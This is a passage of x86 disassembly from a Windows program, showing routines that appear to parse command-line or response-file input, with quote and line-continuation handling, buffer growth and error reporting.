  40490a:	pop    ebx
  40490b:	leave  
  40490c:	ret    0x8
  40490f:	push   ebp
  404910:	mov    ebp,esp
  404912:	sub    esp,0x14
  404915:	push   ebx
  404916:	mov    ebx,ecx
  404918:	push   esi
  404919:	mov    esi,DWORD PTR [ebx+0x10]
  40491c:	xor    eax,eax
  40491e:	push   edi
  40491f:	mov    DWORD PTR [ebp-0x8],ebx
  404922:	mov    DWORD PTR [ebp-0xc],eax
  404925:	mov    edi,eax
  404927:	test   esi,esi
  404929:	je     0x40496e
  40492b:	push   0x2
  40492d:	pop    ebx
  40492e:	mov    edx,DWORD PTR [esi+0x4]
  404931:	mov    ecx,edx
  404933:	lea    eax,[ecx+0x2]
  404936:	mov    DWORD PTR [ebp-0x10],eax
  404939:	mov    ax,WORD PTR [ecx]
  40493c:	add    ecx,ebx
  40493e:	cmp    ax,WORD PTR [ebp-0xc]
  404942:	jne    0x404939
  404944:	sub    ecx,DWORD PTR [ebp-0x10]
  404947:	inc    edi
  404948:	sar    ecx,1
  40494a:	push   0x22
  40494c:	pop    eax
  40494d:	add    edi,ecx
  40494f:	cmp    WORD PTR [edx],ax
  404952:	je     0x404965
  404954:	push   0x20
  404956:	push   edx
  404957:	call   DWORD PTR ds:0x437540
  40495d:	pop    ecx
  40495e:	pop    ecx
  40495f:	test   eax,eax
  404961:	je     0x404965
  404963:	add    edi,ebx
  404965:	mov    esi,DWORD PTR [esi]
  404967:	test   esi,esi
  404969:	jne    0x40492e
  40496b:	mov    ebx,DWORD PTR [ebp-0x8]
  40496e:	xor    ecx,ecx
  404970:	push   0x2
  404972:	lea    eax,[edi+0x1]
  404975:	pop    edx
  404976:	mov    DWORD PTR [ebp-0x10],eax
  404979:	mul    edx
  40497b:	seto   cl
  40497e:	neg    ecx
  404980:	or     ecx,eax
  404982:	call   0x40a2fb
  404987:	mov    edi,eax
  404989:	xor    eax,eax
  40498b:	mov    WORD PTR [edi],ax
  40498e:	mov    esi,DWORD PTR [ebx+0x10]
  404991:	mov    DWORD PTR [ebp-0xc],edi
  404994:	test   esi,esi
  404996:	je     0x404a03
  404998:	mov    ebx,DWORD PTR [ebp-0x10]
  40499b:	mov    eax,DWORD PTR [esi+0x4]
  40499e:	push   0x22
  4049a0:	pop    ecx
  4049a1:	cmp    WORD PTR [eax],cx
  4049a4:	je     0x4049cb
  4049a6:	push   0x20
  4049a8:	push   eax
  4049a9:	call   DWORD PTR ds:0x437540
  4049af:	pop    ecx
  4049b0:	pop    ecx
  4049b1:	test   eax,eax
  4049b3:	je     0x4049cb
  4049b5:	push   0x401098
  4049ba:	push   ebx
  4049bb:	push   edi
  4049bc:	mov    BYTE PTR [ebp-0x1],0x1
  4049c0:	call   DWORD PTR ds:0x4373d4
  4049c6:	add    esp,0xc
  4049c9:	jmp    0x4049d0
  4049cb:	xor    eax,eax
  4049cd:	mov    BYTE PTR [ebp-0x1],al
  4049d0:	push   DWORD PTR [esi+0x4]
  4049d3:	push   ebx
  4049d4:	push   edi
  4049d5:	call   DWORD PTR ds:0x4373d4
  4049db:	add    esp,0xc
  4049de:	cmp    BYTE PTR [ebp-0x1],0x0
  4049e2:	mov    eax,0x40109c
  4049e7:	jne    0x4049ee
  4049e9:	mov    eax,0x4010a4
  4049ee:	push   eax
  4049ef:	push   ebx
  4049f0:	push   edi
  4049f1:	call   DWORD PTR ds:0x4373d4
  4049f7:	mov    esi,DWORD PTR [esi]
  4049f9:	add    esp,0xc
  4049fc:	test   esi,esi
  4049fe:	jne    0x40499b
  404a00:	mov    ebx,DWORD PTR [ebp-0x8]
  404a03:	mov    edx,DWORD PTR [ebx+0x4]
  404a06:	mov    ecx,DWORD PTR [ebx+0xc]
  404a09:	xor    eax,eax
  404a0b:	push   eax
  404a0c:	movzx  eax,BYTE PTR [ebx+0x8]
  404a10:	push   eax
  404a11:	push   DWORD PTR [edx+0x10]
  404a14:	mov    edx,DWORD PTR [edx+0xc]
  404a17:	mov    DWORD PTR ds:0x421efc,edi
  404a1d:	call   0x40536d
  404a22:	mov    DWORD PTR [ebp-0x10],eax
  404a25:	test   eax,eax
  404a27:	jne    0x404a54
  404a29:	mov    esi,DWORD PTR [ebx+0xc]
  404a2c:	test   esi,esi
  404a2e:	je     0x404a54
  404a30:	xor    edi,edi
  404a32:	push   ecx
  404a33:	push   ecx
  404a34:	mov    ecx,DWORD PTR [esi+0x4]
  404a37:	call   0x40de55
  404a3c:	mov    cl,BYTE PTR [eax+0x9]
  404a3f:	and    cl,0xfb
  404a42:	or     cl,0x2
  404a45:	mov    BYTE PTR [eax+0x9],cl
  404a48:	mov    DWORD PTR [eax+0x1c],edi
  404a4b:	mov    esi,DWORD PTR [esi]
  404a4d:	test   esi,esi
  404a4f:	jne    0x404a32
  404a51:	mov    edi,DWORD PTR [ebp-0xc]
  404a54:	push   edi
  404a55:	call   DWORD PTR ds:0x43754c
  404a5b:	mov    eax,DWORD PTR [ebp-0x10]
  404a5e:	pop    ecx
  404a5f:	pop    edi
  404a60:	pop    esi
  404a61:	pop    ebx
  404a62:	leave  
  404a63:	ret    
  404a64:	push   ecx
  404a65:	push   esi
  404a66:	push   edi
  404a67:	mov    esi,ecx
  404a69:	xor    edi,edi
  404a6b:	jmp    0x404a78
  404a6d:	mov    ecx,esi
  404a6f:	call   0x40490f
  404a74:	mov    esi,DWORD PTR [esi]
  404a76:	add    edi,eax
  404a78:	test   esi,esi
  404a7a:	jne    0x404a6d
  404a7c:	mov    eax,edi
  404a7e:	pop    edi
  404a7f:	pop    esi
  404a80:	pop    ecx
  404a81:	ret    
  404a82:	push   esi
  404a83:	push   edi
  404a84:	mov    edi,ecx
  404a86:	mov    esi,DWORD PTR [edi]
  404a88:	test   esi,esi
  404a8a:	je     0x404ab2
  404a8c:	push   ebx
  404a8d:	mov    ebx,DWORD PTR ds:0x43265c
  404a93:	mov    eax,DWORD PTR [esi+0xc]
  404a96:	push   esi
  404a97:	mov    DWORD PTR [eax],ebx
  404a99:	mov    ebx,DWORD PTR [esi+0x10]
  404a9c:	mov    DWORD PTR ds:0x43265c,ebx
  404aa2:	mov    DWORD PTR [ebx],eax
  404aa4:	mov    esi,DWORD PTR [esi]
  404aa6:	call   DWORD PTR ds:0x43754c
  404aac:	pop    ecx
  404aad:	test   esi,esi
  404aaf:	jne    0x404a93
  404ab1:	pop    ebx
  404ab2:	and    DWORD PTR [edi],0x0
  404ab5:	pop    edi
  404ab6:	pop    esi
  404ab7:	ret    
  404ab8:	push   ebp
  404ab9:	mov    ebp,esp
  404abb:	sub    esp,0xc
  404abe:	push   ebx
  404abf:	push   esi
  404ac0:	push   edi
  404ac1:	mov    ebx,ecx
  404ac3:	mov    edi,edx
  404ac5:	mov    eax,DWORD PTR [ebx]
  404ac7:	mov    esi,DWORD PTR [edi]
  404ac9:	push   0xa
  404acb:	pop    ecx
  404acc:	cmp    WORD PTR [eax+esi*2-0x2],cx
  404ad1:	je     0x404bbb
  404ad7:	xor    esi,esi
  404ad9:	mov    DWORD PTR [ebp-0x4],esi
  404adc:	push   DWORD PTR ds:0x421f0c
  404ae2:	push   0x400
  404ae7:	push   0x4216f0
  404aec:	call   DWORD PTR ds:0x4373d8
  404af2:	add    esp,0xc
  404af5:	test   eax,eax
  404af7:	je     0x404bbb
  404afd:	mov    ecx,0x4216f0
  404b02:	lea    edx,[ecx+0x2]
  404b05:	mov    ax,WORD PTR [ecx]
  404b08:	add    ecx,0x2
  404b0b:	cmp    ax,si
  404b0e:	jne    0x404b05
  404b10:	sub    ecx,edx
  404b12:	sar    ecx,1
  404b14:	cmp    WORD PTR [ecx*2+0x4216ec],0x5c
  404b1d:	jne    0x404b41
  404b1f:	push   0xa
  404b21:	pop    eax
  404b22:	cmp    WORD PTR [ecx*2+0x4216ee],ax
  404b2a:	jne    0x404b41
  404b2c:	xor    eax,eax
  404b2e:	push   0x20
  404b30:	mov    WORD PTR [ecx*2+0x4216ee],ax
  404b38:	pop    eax
  404b39:	mov    WORD PTR [ecx*2+0x4216ec],ax
  404b41:	mov    esi,DWORD PTR [edi]
  404b43:	mov    ecx,0x4216f0
  404b48:	lea    edx,[ecx+0x2]
  404b4b:	mov    ax,WORD PTR [ecx]
  404b4e:	add    ecx,0x2
  404b51:	cmp    ax,WORD PTR [ebp-0x4]
  404b55:	jne    0x404b4b
  404b57:	sub    ecx,edx
  404b59:	sar    ecx,1
  404b5b:	lea    edx,[ecx+esi*1]
  404b5e:	mov    ecx,DWORD PTR [ebx]
  404b60:	mov    DWORD PTR [edi],edx
  404b62:	lea    edx,[edx*2+0x2]
  404b69:	call   0x40a33e
  404b6e:	mov    ecx,eax
  404b70:	mov    DWORD PTR [ebp-0x8],ecx
  404b73:	test   ecx,ecx
  404b75:	jne    0x404b8c
  404b77:	push   0x419
  404b7c:	push   DWORD PTR ds:0x4216d4
  404b82:	call   0x405021
  404b87:	pop    ecx
  404b88:	pop    ecx
  404b89:	mov    ecx,DWORD PTR [ebp-0x8]
  404b8c:	mov    eax,DWORD PTR [edi]
  404b8e:	sub    eax,esi
  404b90:	inc    eax
  404b91:	push   0x4216f0
  404b96:	push   eax
  404b97:	lea    eax,[ecx+esi*2]
  404b9a:	push   eax
  404b9b:	mov    DWORD PTR [ebx],ecx
  404b9d:	call   DWORD PTR ds:0x4373d0
  404ba3:	mov    ecx,DWORD PTR [edi]
  404ba5:	mov    eax,DWORD PTR [ebx]
  404ba7:	add    esp,0xc
  404baa:	push   0xa
  404bac:	pop    edx
  404bad:	push   0x0
  404baf:	pop    esi
  404bb0:	cmp    WORD PTR [eax+ecx*2-0x2],dx
  404bb5:	jne    0x404adc
  404bbb:	pop    edi
  404bbc:	pop    esi
  404bbd:	pop    ebx
  404bbe:	leave  
  404bbf:	ret    
  404bc0:	push   ebp
  404bc1:	mov    ebp,esp
  404bc3:	push   ebx
  404bc4:	push   esi
  404bc5:	mov    esi,DWORD PTR [ebp+0x8]
  404bc8:	push   edi
  404bc9:	mov    edi,ecx
  404bcb:	mov    ecx,DWORD PTR [esi]
  404bcd:	mov    ebx,edx
  404bcf:	test   ecx,ecx
  404bd1:	jne    0x404bdd
  404bd3:	push   0x20
  404bd5:	pop    ecx
  404bd6:	call   0x40a2fb
  404bdb:	jmp    0x404bea
  404bdd:	test   bl,0x7
  404be0:	jne    0x404bec
  404be2:	lea    edx,[ebx+0x8]
  404be5:	call   0x404fd1
  404bea:	mov    DWORD PTR [esi],eax
  404bec:	mov    ecx,edi
  404bee:	call   0x40dd18
  404bf3:	mov    ecx,DWORD PTR [esi]
  404bf5:	pop    edi
  404bf6:	pop    esi
  404bf7:	mov    DWORD PTR [ecx+ebx*4],eax
  404bfa:	pop    ebx
  404bfb:	pop    ebp
  404bfc:	ret    0x4
  404bff:	push   ebp
  404c00:	mov    ebp,esp
  404c02:	push   ecx
  404c03:	push   esi
  404c04:	push   edi
  404c05:	mov    esi,ecx
  404c07:	push   0x5c
  404c09:	push   esi
  404c0a:	mov    edi,edx
  404c0c:	call   DWORD PTR ds:0x437540
  404c12:	pop    ecx
  404c13:	pop    ecx
  404c14:	test   eax,eax
  404c16:	je     0x404c32
  404c18:	movzx  ecx,WORD PTR [eax-0x2]
  404c1c:	cmp    ecx,0x20
  404c1f:	je     0x404c26
  404c21:	cmp    ecx,0x9
  404c24:	jne    0x404c32
  404c26:	cmp    WORD PTR [eax+0x2],0xa
  404c2b:	jne    0x404c32
  404c2d:	xor    ecx,ecx
  404c2f:	mov    WORD PTR [eax],cx
  404c32:	and    DWORD PTR [ebp-0x4],0x0
  404c36:	lea    eax,[ebp-0x4]
  404c39:	push   eax
  404c3a:	push   0x4015b4
  404c3f:	push   esi
  404c40:	mov    esi,DWORD PTR ds:0x4373c8
  404c46:	jmp    0x404c67
  404c48:	cmp    WORD PTR [eax],0x40
  404c4c:	je     0x404c72
  404c4e:	push   DWORD PTR [ebp+0x8]
  404c51:	mov    edx,DWORD PTR [edi]
  404c53:	mov    ecx,eax
  404c55:	call   0x404bc0
  404c5a:	inc    DWORD PTR [edi]
  404c5c:	lea    eax,[ebp-0x4]
  404c5f:	push   eax
  404c60:	push   0x4015b4
  404c65:	push   0x0
  404c67:	call   esi
  404c69:	add    esp,0xc
  404c6c:	test   eax,eax
  404c6e:	jne    0x404c48
  404c70:	jmp    0x404c85
  404c72:	add    eax,0x2
  404c75:	push   eax
  404c76:	push   0xfa1
  404c7b:	push   0x0
  404c7d:	call   0x405021
  404c82:	add    esp,0xc
  404c85:	pop    edi
  404c86:	pop    esi
  404c87:	leave  
  404c88:	ret    0x4
  404c8b:	push   ebp
  404c8c:	mov    ebp,esp
  404c8e:	sub    esp,0x18
  404c91:	push   ebx
  404c92:	push   esi
  404c93:	push   edi
  404c94:	xor    eax,eax
  404c96:	push   0x22
  404c98:	mov    BYTE PTR [ebp-0x1],al
  404c9b:	pop    eax
  404c9c:	mov    edi,ecx
  404c9e:	push   eax
  404c9f:	mov    ebx,edx
  404ca1:	push   edi
  404ca2:	mov    DWORD PTR [ebp-0x14],ebx
  404ca5:	call   DWORD PTR ds:0x437540
  404cab:	mov    esi,eax
  404cad:	pop    ecx
  404cae:	pop    ecx
  404caf:	test   esi,esi
  404cb1:	jne    0x404cc4
  404cb3:	push   DWORD PTR [ebp+0x8]
  404cb6:	mov    edx,ebx
  404cb8:	mov    ecx,edi
  404cba:	call   0x404bff
  404cbf:	jmp    0x404e30
  404cc4:	push   0x20
  404cc6:	pop    ecx
  404cc7:	push   0xa
  404cc9:	mov    DWORD PTR [ebp-0x18],ecx
  404ccc:	mov    DWORD PTR [ebp-0xc],0x9
  404cd3:	pop    edx
  404cd4:	cmp    esi,edi
  404cd6:	je     0x404d1e
  404cd8:	cmp    WORD PTR [esi-0x2],0x3d
  404cdd:	jne    0x404d1e
  404cdf:	mov    WORD PTR [esi],cx
  404ce2:	add    esi,0xfffffffe
  404ce5:	jmp    0x404cfd
  404ce7:	movzx  eax,WORD PTR [esi]
  404cea:	cmp    ax,cx
  404ced:	je     0x404d01
  404cef:	cmp    ax,WORD PTR [ebp-0xc]
  404cf3:	je     0x404d01
  404cf5:	cmp    ax,dx
  404cf8:	je     0x404d01
  404cfa:	sub    esi,0x2
  404cfd:	cmp    esi,edi
  404cff:	ja     0x404ce7
  404d01:	cmp    esi,edi
  404d03:	je     0x404d19
  404d05:	push   DWORD PTR [ebp+0x8]
  404d08:	xor    eax,eax
  404d0a:	mov    WORD PTR [esi],ax
  404d0d:	mov    edx,ebx
  404d0f:	mov    ecx,edi
  404d11:	add    esi,0x2
  404d14:	call   0x404bff
  404d19:	mov    DWORD PTR [ebp-0x8],esi
  404d1c:	jmp    0x404d35
  404d1e:	push   DWORD PTR [ebp+0x8]
  404d21:	xor    eax,eax
  404d23:	mov    WORD PTR [esi],ax
  404d26:	add    esi,0x2
  404d29:	mov    edx,ebx
  404d2b:	mov    ecx,edi
  404d2d:	mov    DWORD PTR [ebp-0x8],esi
  404d30:	call   0x404bff
  404d35:	mov    ebx,esi
  404d37:	xor    edx,edx
  404d39:	lea    ecx,[ebx+0x2]
  404d3c:	mov    ax,WORD PTR [ebx]
  404d3f:	add    ebx,0x2
  404d42:	cmp    ax,dx
  404d45:	jne    0x404d3c
  404d47:	sub    ebx,ecx
  404d49:	sar    ebx,1
  404d4b:	mov    edi,esi
  404d4d:	cmp    WORD PTR [esi],dx
  404d50:	je     0x404e0e
  404d56:	push   0x22
  404d58:	pop    ecx
  404d59:	movzx  eax,WORD PTR [edi]
  404d5c:	cmp    ax,cx
  404d5f:	jne    0x404d80
  404d61:	push   0x22
  404d63:	pop    eax
  404d64:	cmp    WORD PTR [edi+0x2],ax
  404d68:	jne    0x404de3
  404d6a:	mov    ecx,edi
  404d6c:	mov    WORD PTR [edi],ax
  404d6f:	lea    ecx,[ecx+0x2]
  404d72:	movzx  eax,WORD PTR [ecx+0x2]
  404d76:	mov    WORD PTR [ecx],ax
  404d79:	test   ax,ax
  404d7c:	jne    0x404d6f
  404d7e:	jmp    0x404dd2
  404d80:	cmp    eax,0x5c
  404d83:	jne    0x404dd5
  404d85:	movzx  eax,WORD PTR [edi-0x2]
  404d89:	cmp    ax,WORD PTR [ebp-0x18]
  404d8d:	je     0x404d95
  404d8f:	cmp    ax,WORD PTR [ebp-0xc]
  404d93:	jne    0x404dd5
  404d95:	push   0xa
  404d97:	pop    eax
  404d98:	cmp    WORD PTR [edi+0x2],ax
  404d9c:	jne    0x404dd5
  404d9e:	xor    eax,eax
  404da0:	sub    ebx,0x2
  404da3:	mov    WORD PTR [edi],ax
  404da6:	mov    DWORD PTR [ebp-0x10],ebx
  404da9:	cmp    BYTE PTR [ebp-0x1],al
  404dac:	jne    0x404dbc
  404dae:	mov    ecx,esi
  404db0:	mov    BYTE PTR [ebp-0x1],0x1
  404db4:	call   0x40dd18
  404db9:	mov    DWORD PTR [ebp-0x8],eax
  404dbc:	lea    edx,[ebp-0x10]
  404dbf:	lea    ecx,[ebp-0x8]
  404dc2:	call   0x404ab8
  404dc7:	mov    esi,DWORD PTR [ebp-0x8]
  404dca:	xor    edx,edx
  404dcc:	lea    edi,[esi+ebx*2]
  404dcf:	mov    ebx,DWORD PTR [ebp-0x10]
  404dd2:	push   0x22
  404dd4:	pop    ecx
  404dd5:	add    edi,0x2
  404dd8:	cmp    WORD PTR [edi],dx
  404ddb:	jne    0x404d59
  404de1:	jmp    0x404e0e
  404de3:	mov    edx,DWORD PTR [ebp-0x14]
  404de6:	push   DWORD PTR [ebp+0x8]
  404de9:	mov    edx,DWORD PTR [edx]
  404deb:	xor    eax,eax
  404ded:	mov    WORD PTR [edi],ax
  404df0:	mov    ecx,esi
  404df2:	add    edi,0x2
  404df5:	call   0x404bc0
  404dfa:	mov    eax,DWORD PTR [ebp-0x14]
  404dfd:	push   DWORD PTR [ebp+0x8]
  404e00:	inc    DWORD PTR [eax]
  404e02:	lea    ecx,[edi+0x2]
  404e05:	mov    edx,eax
  404e07:	call   0x404c8b
  404e0c:	xor    edx,edx
  404e0e:	lea    eax,[esi+ebx*2]
  404e11:	cmp    edi,eax
  404e13:	jne    0x404e22
  404e15:	push   0x3ee
  404e1a:	push   edx
  404e1b:	call   0x405021
  404e20:	pop    ecx
  404e21:	pop    ecx
  404e22:	cmp    BYTE PTR [ebp-0x1],0x0
  404e26:	je     0x404e30
  404e28:	push   esi
  404e29:	call   DWORD PTR ds:0x43754c
  404e2f:	pop    ecx
  404e30:	pop    edi
  404e31:	pop    esi
  404e32:	pop    ebx
  404e33:	leave  
  404e34:	ret    0x4
  404e37:	push   ebp
  404e38:	mov    ebp,esp
  404e3a:	sub    esp,0x14
  404e3d:	push   ebx
  404e3e:	push   esi
  404e3f:	push   edi
  404e40:	push   0x20
  404e42:	pop    eax
  404e43:	push   eax
  404e44:	mov    ebx,ecx
  404e46:	xor    edi,edi
  404e48:	push   0x4015bc
  404e4d:	mov    esi,edi
  404e4f:	push   ebx
  404e50:	mov    DWORD PTR [ebp-0xc],esi
  404e53:	call   DWORD PTR ds:0x4373dc
  404e59:	add    esp,0xc
  404e5c:	mov    ds:0x421f0c,eax
  404e61:	test   eax,eax
  404e63:	jne    0x404e74
  404e65:	push   ebx
  404e66:	push   0x41c
  404e6b:	push   edi
  404e6c:	call   0x405021
  404e71:	add    esp,0xc
  404e74:	push   eax
  404e75:	push   0x400
  404e7a:	push   0x4216f0
  404e7f:	mov    DWORD PTR [ebp-0x10],edi
  404e82:	call   DWORD PTR ds:0x4373d8
  404e88:	add    esp,0xc
  404e8b:	test   eax,eax
  404e8d:	je     0x404f81
  404e93:	xor    edi,edi
  404e95:	mov    esi,0x4216f0
  404e9a:	mov    ecx,esi
  404e9c:	lea    edx,[ecx+0x2]
  404e9f:	mov    ax,WORD PTR [ecx]
  404ea2:	add    ecx,0x2
  404ea5:	cmp    ax,di
  404ea8:	jne    0x404e9f
  404eaa:	sub    ecx,edx
  404eac:	sar    ecx,1
  404eae:	push   0xa
  404eb0:	mov    DWORD PTR [ebp-0x4],ecx
  404eb3:	pop    eax
  404eb4:	cmp    ecx,0x3ff
  404eba:	jne    0x404ec5
  404ebc:	cmp    WORD PTR ds:0x421eec,ax
  404ec3:	jne    0x404ede
  404ec5:	cmp    WORD PTR [ecx*2+0x4216ee],ax
  404ecd:	jne    0x404f3b
  404ecf:	push   0x5c
  404ed1:	pop    edx
  404ed2:	cmp    WORD PTR [ecx*2+0x4216ec],dx
  404eda:	jne    0x404f3b
  404edc:	jmp    0x404ee1
  404ede:	push   0x5c
  404ee0:	pop    edx
  404ee1:	cmp    WORD PTR [ecx*2+0x4216ee],ax
  404ee9:	jne    0x404f23
  404eeb:	cmp    WORD PTR [ecx*2+0x4216ec],dx
  404ef3:	jne    0x404f23
  404ef5:	lea    eax,[ecx-0x1]
  404ef8:	lea    edx,[eax+eax*1]
  404efb:	cmp    edx,0x800
  404f01:	jae    0x404fc9
  404f07:	xor    esi,esi
  404f09:	mov    WORD PTR [edx+0x4216f0],si
  404f10:	push   0x20
  404f12:	pop    edx
  404f13:	mov    WORD PTR [ecx*2+0x4216ec],dx
  404f1b:	mov    DWORD PTR [ebp-0x4],eax
  404f1e:	mov    esi,0x4216f0
  404f23:	mov    ecx,esi
  404f25:	call   0x40dd18
  404f2a:	lea    edx,[ebp-0x4]
  404f2d:	lea    ecx,[ebp-0x8]
  404f30:	mov    DWORD PTR [ebp-0x8],eax
  404f33:	call   0x404ab8
  404f38:	mov    esi,DWORD PTR [ebp-0x8]
  404f3b:	lea    eax,[ebp-0x10]
  404f3e:	push   eax
  404f3f:	lea    edx,[ebp-0xc]
  404f42:	mov    ecx,esi
  404f44:	call   0x404c8b
  404f49:	cmp    esi,0x4216f0
  404f4f:	je     0x404f59
  404f51:	push   esi
  404f52:	call   DWORD PTR ds:0x43754c
  404f58:	pop    ecx
  404f59:	push   DWORD PTR ds:0x421f0c
  404f5f:	mov    esi,0x4216f0
  404f64:	push   0x400
  404f69:	push   esi
  404f6a:	call   DWORD PTR ds:0x4373d8
  404f70:	add    esp,0xc
  404f73:	test   eax,eax
  404f75:	jne    0x404e9a
  404f7b:	mov    esi,DWORD PTR [ebp-0xc]
  404f7e:	mov    edi,DWORD PTR [ebp-0x10]
  404f81:	push   DWORD PTR ds:0x421f0c
  404f87:	call   DWORD PTR ds:0x4373e0
  404f8d:	pop    ecx
  404f8e:	cmp    eax,0xffffffff
  404f91:	jne    0x404fa4
  404f93:	push   ebx
  404f94:	xor    eax,eax
  404f96:	push   0x424
  404f9b:	push   eax
  404f9c:	call   0x405021
  404fa1:	add    esp,0xc
  404fa4:	mov    edx,edi
  404fa6:	mov    ecx,esi
  404fa8:	call   0x40b9a0
  404fad:	jmp    0x404fc0
  404faf:	dec    esi
  404fb0:	cmp    DWORD PTR [edi+esi*4],0x0
  404fb4:	je     0x404fc0
  404fb6:	push   DWORD PTR [edi+esi*4]
  404fb9:	call   DWORD PTR ds:0x43754c
  404fbf:	pop    ecx
  404fc0:	test   esi,esi
  404fc2:	jne    0x404faf
  404fc4:	pop    edi
  404fc5:	pop    esi
  404fc6:	pop    ebx
  404fc7:	leave  
  404fc8:	ret    
  404fc9:	call   0x40fe50
  404fce:	int3   
  404fcf:	int3   
  404fd0:	int3   
  404fd1:	push   esi
  404fd2:	xor    esi,esi
  404fd4:	test   ecx,ecx
  404fd6:	je     0x404ff0
  404fd8:	cmp    edx,0x3ffffffe
  404fde:	ja     0x40500b
  404fe0:	mov    eax,edx
  404fe2:	shl    eax,0x2
  404fe5:	push   eax
  404fe6:	push   ecx
  404fe7:	call   DWORD PTR ds:0x4373e4
  404fed:	pop    ecx
  404fee:	jmp    0x405004
  404ff0:	cmp    edx,0x3ffffffe
  404ff6:	ja     0x40500b
  404ff8:	mov    eax,edx
  404ffa:	shl    eax,0x2
  404ffd:	push   eax
  404ffe:	call   DWORD PTR ds:0x4373e8
  405004:	mov    esi,eax
  405006:	pop    ecx
  405007:	test   esi,esi
  405009:	jne    0x40501d
  40500b:	push   0x41b
  405010:	push   DWORD PTR ds:0x4216e0
  405016:	call   0x405021
  40501b:	pop    ecx
  40501c:	pop    ecx
  40501d:	mov    eax,esi
  40501f:	pop    esi
  405020:	ret    
  405021:	push   ebp
  405022:	mov    ebp,esp
  405024:	test   BYTE PTR ds:0x4114bc,0x20
  40502b:	push   esi
  40502c:	push   edi
  40502d:	push   0x2
  40502f:	pop    esi
  405030:	mov    edi,0x3e8
  405035:	je     0x405047
  405037:	mov    eax,DWORD PTR [ebp+0xc]
  40503a:	xor    edx,edx
  40503c:	div    edi
  40503e:	cmp    eax,0x4
  405041:	je     0x4050f3
  405047:	call   0x40518d
  40504c:	cmp    DWORD PTR [ebp+0x8],0x0
  405050:	je     0x40506a
  405052:	push   DWORD PTR [ebp+0x8]
  405055:	push   DWORD PTR ds:0x421f14
  40505b:	push   0x4015dc
  405060:	call   0x40c215
  405065:	add    esp,0xc
  405068:	jmp    0x405075
  40506a:	push   0x4015f0
  40506f:	call   0x40c215
  405074:	pop    ecx
  405075:	mov    eax,DWORD PTR [ebp+0xc]
  405078:	xor    edx,edx
  40507a:	div    edi
  40507c:	mov    edi,eax
  40507e:	mov    ecx,edi
  405080:	dec    ecx
  405081:	je     0x405098
  405083:	dec    ecx
  405084:	je     0x40508e
  405086:	sub    ecx,esi
  405088:	jne    0x4050ac
  40508a:	push   0x16
  40508c:	jmp    0x405090
  40508e:	push   0x15
  405090:	call   0x4050f7
  405095:	pop    ecx
  405096:	jmp    0x4050ac
  405098:	push   0x14
  40509a:	call   0x4050f7
  40509f:	cmp    DWORD PTR [ebp+0xc],0x41b
  4050a6:	pop    ecx
  4050a7:	jne    0x4050ac
  4050a9:	push   0x4
  4050ab:	pop    esi
  4050ac:	push   DWORD PTR [ebp+0xc]
  4050af:	push   0x401604
  4050b4:	call   0x40c215
  4050b9:	pop    ecx
  4050ba:	pop    ecx
  4050bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4050be:	call   0x40c09a
  4050c3:	lea    edx,[ebp+0x10]
  4050c6:	mov    ecx,eax
  4050c8:	call   0x40c28a
  4050cd:	call   0x40c224
  4050d2:	call   0x40c1f7
  4050d7:	cmp    edi,0x1
  4050da:	jne    0x4050f3
  4050dc:	push   0x401618
  4050e1:	call   0x40c215
  4050e6:	pop    ecx
  4050e7:	call   0x40c006
  4050ec:	push   esi
  4050ed:	call   DWORD PTR ds:0x4373ec
  4050f3:	pop    edi
  4050f4:	pop    esi
  4050f5:	pop    ebp
  4050f6:	ret    
  4050f7:	push   ebp
  4050f8:	mov    ebp,esp
  4050fa:	and    esp,0xfffffff8
  4050fd:	push   ecx
  4050fe:	cmp    DWORD PTR [ebp+0x8],0xd
  405102:	push   ebx
  405103:	mov    bh,0x1
  405105:	je     0x405110
  405107:	test   BYTE PTR ds:0x4114bc,0x20
  40510e:	jne    0x405188
  405110:	call   0x40518d
  405115:	mov    ecx,DWORD PTR [ebp+0x8]
  405118:	push   0x5
  40511a:	lea    eax,[ecx-0x14]
  40511d:	pop    edx
  40511e:	cmp    edx,eax
  405120:	sbb    bl,bl
  405122:	and    bl,bh
  405124:	cmp    ecx,0x18
  405127:	jne    0x40513c
  405129:	test   bl,bl
  40512b:	je     0x405134
  40512d:	call   0x40c2df
  405132:	jmp    0x405139
  405134:	call   0x40c224
  405139:	mov    ecx,DWORD PTR [ebp+0x8]
  40513c:	call   0x40c09a
  405141:	lea    edx,[ebp+0xc]
  405144:	mov    ecx,eax
  405146:	test   bl,bl
  405148:	je     0x405151
  40514a:	call   0x40c30a
  40514f:	jmp    0x405156
  405151:	call   0x40c28a
  405156:	cmp    DWORD PTR [ebp+0x8],0xa
  40515a:	jb     0x405162
  40515c:	cmp    DWORD PTR [ebp+0x8],0x17
  405160:	jbe    0x405178
  405162:	cmp    DWORD PTR [ebp+0x8],0x7c
  405166:	je     0x405178
  405168:	test   bl,bl
  40516a:	je     0x405173
  40516c:	call   0x40c2df
  405171:	jmp    0x405178
  405173:	call   0x40c224
  405178:	test   bl,bl
  40517a:	je     0x405183
  40517c:	call   0x40c2b2
  405181:	jmp    0x405188
  405183:	call   0x40c1f7
  405188:	pop    ebx
  405189:	mov    esp,ebp
  40518b:	pop    ebp
  40518c:	ret    
  40518d:	cmp    BYTE PTR ds:0x421f10,0x0
  405194:	jne    0x4051b8
  405196:	push   0x401628
  40519b:	push   0x18
  40519d:	mov    BYTE PTR ds:0x421f10,0x1
  4051a4:	call   0x4050f7
  4051a9:	push   0x19
  4051ab:	call   0x4050f7
  4051b0:	add    esp,0xc
  4051b3:	jmp    0x40c1f7
  4051b8:	ret    
  4051b9:	push   ebp
  4051ba:	mov    ebp,esp
  4051bc:	sub    esp,0x10
  4051bf:	push   ebx
  4051c0:	push   esi
  4051c1:	mov    esi,DWORD PTR [ebp+0x8]
  4051c4:	mov    eax,ecx
  4051c6:	xor    ecx,ecx
  4051c8:	mov    ebx,edx
  4051ca:	push   edi
  4051cb:	mov    DWORD PTR [ebp-0x8],ebx
  4051ce:	mov    DWORD PTR [ebp-0xc],eax
  4051d1:	mov    BYTE PTR [ebp-0x1],0x1
  4051d5:	mov    edi,esi
  4051d7:	cmp    WORD PTR [esi],cx
  4051da:	je     0x4051e4
  4051dc:	add    edi,0x2
  4051df:	cmp    WORD PTR [edi],cx
  4051e2:	jne    0x4051dc
  4051e4:	mov    DWORD PTR [eax],ecx
  4051e6:	cmp    esi,edi
  4051e8:	jae    0x40531e
  4051ee:	push   0x401090
  4051f3:	push   esi
  4051f4:	call   DWORD PTR ds:0x4373f0
  4051fa:	lea    esi,[esi+eax*2]
  4051fd:	pop    ecx
  4051fe:	pop    ecx
  4051ff:	cmp    esi,edi
  405201:	jae    0x40531c
